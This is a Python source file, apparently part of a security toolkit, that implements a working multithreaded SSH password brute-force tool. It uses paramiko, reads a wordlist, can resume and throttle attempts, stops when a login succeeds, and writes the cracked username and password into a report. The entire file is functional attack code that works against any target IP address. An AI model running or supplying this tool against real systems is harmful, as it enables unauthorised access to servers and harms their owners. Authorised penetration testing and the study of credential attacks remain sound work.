import argparse
import itertools
import os
import sys
import threading
import time
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait

import paramiko

from pysec.report import ReportBuilder, add_report_arguments, write_report


def add_arguments(parser):
    parser.add_argument('target', nargs='?', help='Target IP address')
    parser.add_argument('-u', '--username', help='Username to bruteforce')
    parser.add_argument('-w', '--wordlist', help='Path to the password file')
    parser.add_argument('-P', '--port', type=int, default=22, help='SSH port (default: 22)')
    parser.add_argument('-T', '--threads', type=int, default=4, help='Number of threads (default: 4)')
    parser.add_argument('-d', '--delay', type=float, default=0, help='Delay between attempts in seconds (default: 0)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout in seconds (default: 5)')
    parser.add_argument('--resume', help='Resume from a specific line number in password file')
    add_report_arguments(parser)

def ssh_connect(target, port, username, password, timeout=5, code=0):
    """Try to connect to target using SSH with the given credentials."""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=port, username=username, password=password, timeout=timeout)
    except paramiko.AuthenticationException:
        code = 1
    except paramiko.SSHException:
        code = 2
    except Exception:
        code = 3
    finally:
        ssh.close()

    return code

def attempt_login(target, port, username, password, verbose, timeout, delay=0, stop_event=None):
    """Attempt to login with provided credentials and handle the output."""
    if stop_event is not None and stop_event.is_set():
        return None, -1, password

    if delay > 0:
        time.sleep(delay)

    if stop_event is not None and stop_event.is_set():
        return None, -1, password

    response = ssh_connect(target, port, username, password, timeout)
    result = None

    if response == 0:
        result = f"[+] SUCCESS: Password found: {password}"
    elif response == 1:
        if verbose:
            result = f"[-] FAILED: {username}@{target}:{port} - Password: {password}"
    elif response == 2:
        result = f"[!] ERROR: SSH connection error - {password}"
    elif response == 3:
        result = f"[!] ERROR: Connection error - {password}"

    return result, response, password

def handle_interrupt(passwords_tried, current_password):
    """Handle keyboard interrupt gracefully."""
    print(f"\n\n[*] Exiting after trying {passwords_tried} passwords")
    print(f"[*] Last password attempted: {current_password}")
    print("[*] You can resume later using --resume option")
    sys.exit(1)

def run(args):
    """Execute the brute force attack."""
    # Interactively get parameters if not provided via command line
    target = args.target if args.target else input('Please enter target IP address: ')
    username = args.username if args.username else input('Please enter username to bruteforce: ')
    password_file = args.wordlist if args.wordlist else input('Please enter location of the password file: ')

    # Validate input file
    if not os.path.isfile(password_file):
        print(f"[!] Error: Password file '{password_file}' not found")
        sys.exit(1)

    # Count non-blank passwords for progress reporting
    try:
        total_passwords = sum(1 for line in open(password_file, errors='ignore') if line.strip())
    except UnicodeDecodeError:
        # Fallback to binary mode if UTF-8 decoding fails
        total_passwords = sum(1 for line in open(password_file, 'rb') if line.strip())
    print(f"[*] Loaded {total_passwords} passwords from {password_file}")

    report = ReportBuilder("ssh", target)

    # Set up resume functionality
    start_line = 0
    if args.resume and args.resume.isdigit():
        start_line = int(args.resume)
        print(f"[*] Resuming from line {start_line}")

    passwords_tried = start_line
    current_password = ""
    stop_event = threading.Event()

    def emit_report(found_password):
        if not getattr(args, "report", None):
            return
        findings = []
        if found_password:
            findings.append({
                "target": f"{username}@{target}:{args.port}",
                "username": username,
                "password": found_password,
            })
        built = report.build(
            summary={
                "username": username,
                "port": args.port,
                "passwords_tried": passwords_tried,
                "success": bool(found_password),
            },
            findings=findings,
        )
        for path in write_report(built, args.report, args.report_format):
            print(f"[+] Report written to {path}")

    def submit(executor, password):
        return executor.submit(
            attempt_login,
            target,
            args.port,
            username,
            password,
            args.verbose,
            args.timeout,
            args.delay,
            stop_event
        )

    try:
        with open(password_file, errors='ignore') as file:
            # Skip to resume point if specified
            for _ in range(start_line):
                next(file, None)

            passwords = (line.strip() for line in file if line.strip())

            with ThreadPoolExecutor(max_workers=args.threads) as executor:
                # Keep a bounded number of attempts in flight instead of queueing the whole file
                pending = {submit(executor, pw): pw for pw in itertools.islice(passwords, args.threads * 2)}
                found_password = None

                while pending and found_password is None:
                    done, _ = wait(pending, return_when=FIRST_COMPLETED)

                    for future in done:
                        pending.pop(future)
                        result, response, password = future.result()

                        if response == -1:
                            continue

                        passwords_tried += 1
                        current_password = password

                        if result and (args.verbose or response == 0):
                            print(f"\r{result}")

                        if passwords_tried % 10 == 0:
                            percent = (passwords_tried / total_passwords) * 100
                            print(f"\r[*] Progress: {passwords_tried}/{total_passwords} ({percent:.2f}%)", end="")

                        if response == 0:
                            found_password = password
                            break

                        next_password = next(passwords, None)
                        if next_password is not None:
                            pending[submit(executor, next_password)] = next_password

                if found_password is not None:
                    # Signal in-flight attempts to short-circuit and cancel the queued ones
                    stop_event.set()
                    for future in pending:
                        future.cancel()

                    print("\n[+] Authentication successful!")
                    print(f"[+] Target: {username}@{target}:{args.port}")
                    print(f"[+] Password: {found_password}")

                    emit_report(found_password)
                    return True

        print(f"\n[-] Exhausted password list ({passwords_tried} passwords)")
        print("[-] No valid password found")
        emit_report(None)
        return False

    except KeyboardInterrupt:
        handle_interrupt(passwords_tried, current_password)


def main(argv=None):
    parser = argparse.ArgumentParser(description='SSH Brute Force Tool')
    add_arguments(parser)
    run(parser.parse_args(argv))


if __name__ == "__main__":
    main()
